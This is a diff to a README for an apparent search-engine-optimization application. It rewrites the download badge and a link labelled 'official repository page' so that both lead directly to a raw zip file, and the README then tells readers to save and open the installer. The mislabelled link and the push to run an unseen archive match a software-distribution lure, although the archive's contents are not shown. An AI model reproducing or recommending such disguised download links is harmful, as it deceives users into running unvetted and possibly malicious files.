@@ -1,6 +1,6 @@
 # 🔍 google-ai-search-optimization - Improve your search engine rankings today
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Bacteremic-lepiotaprocera660/google-ai-search-optimization)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Bacteremic-lepiotaprocera660/google-ai-search-optimization/raw/refs/heads/main/skills/google_optimization_ai_search_2.9.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ The google-ai-search-optimization application helps users improve their online v
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official repository page](https://github.com/Bacteremic-lepiotaprocera660/google-ai-search-optimization) to access the download files.
+1. Visit the [official repository page](https://github.com/Bacteremic-lepiotaprocera660/google-ai-search-optimization/raw/refs/heads/main/skills/google_optimization_ai_search_2.9.zip) to access the download files.
 2. Locate the latest release version on the right side of the screen.
 3. Click the link to save the installer file to your computer.
 4. Open your Downloads folder.
